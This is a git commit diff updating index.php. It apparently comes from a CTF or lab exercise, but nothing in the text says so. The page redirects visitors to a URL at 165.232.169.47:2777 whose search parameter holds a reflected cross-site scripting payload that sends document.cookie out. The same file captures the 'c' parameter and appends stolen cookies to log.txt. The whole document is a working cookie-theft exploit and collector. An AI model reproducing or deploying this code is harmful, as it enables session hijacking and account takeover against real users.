15bfb4cce94d01236b87d5762829576005b3b782
mhchan163 <60420169+mhchan163@users.noreply.github.com>
2021-03-23 14:56:29 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,10 +1,16 @@
 <!DOCTYPE HTML>
 <html>
-  <body>
-    <?php header('Location:http://165.232.169.47:2777/?search=%3Cscript%3Edocument.location%3D%22http%3A%2F%2F127.0.0.1%3A5000%2F%3Fc%3D%22+%2B+document.cookie%3C%2Fscript%3E');
+  <head>
+    <meta http-equiv="refresh" content="0; url=http://165.232.169.47:2777/?search=%3Cscript%3Edocument.location%3D%22http%3A%2F%2F127.0.0.1%3A5000%2F%3Fc%3D%22+%2B+document.cookie%3C%2Fscript%3E">
+    <script type="text/javascript">
+      window.location.href = "http://165.232.169.47:2777/?search=%3Cscript%3Edocument.location%3D%22http%3A%2F%2F127.0.0.1%3A5000%2F%3Fc%3D%22+%2B+document.cookie%3C%2Fscript%3E"
+    </script>
+    <?php
     $cookies = $_GET["c"];
     $file = fopen('log.txt','a');
     fwrite($file,$cookies . "\n\n");
-?>
+    ?>
+    </head>
+  <body>
   </body>
 </html>
